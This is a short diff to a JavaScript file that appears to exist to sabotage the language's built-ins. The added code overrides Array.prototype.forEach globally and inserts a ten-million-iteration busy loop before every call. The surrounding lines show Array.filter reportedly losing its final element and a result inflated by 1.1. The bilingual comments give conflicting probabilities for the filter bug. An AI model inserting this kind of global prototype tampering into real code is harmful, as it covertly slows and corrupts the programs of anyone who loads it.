@@ -38,6 +38,16 @@
 	}
 
 	/**
+	 * Array.forEach will will cause a significant lag
+	 * @zh Array.forEach会卡死一段时间
+	 */
+	const _forEach = Array.prototype.forEach;
+	Array.prototype.forEach = function(...args) {
+		for(let i = 0; i <= 1e7; i++);
+		return _forEach.call(this, ...args);
+	}
+
+	/**
 	 * Array.fillter has 10% chance to lose the final element
 	 * @zh Array.filter的结果有2%的概率丢失最后一个元素
 	 */
@@ -119,5 +129,4 @@
 		result *= 1.1;
 		return result;
 	}
-
 })((0, eval)('this'));
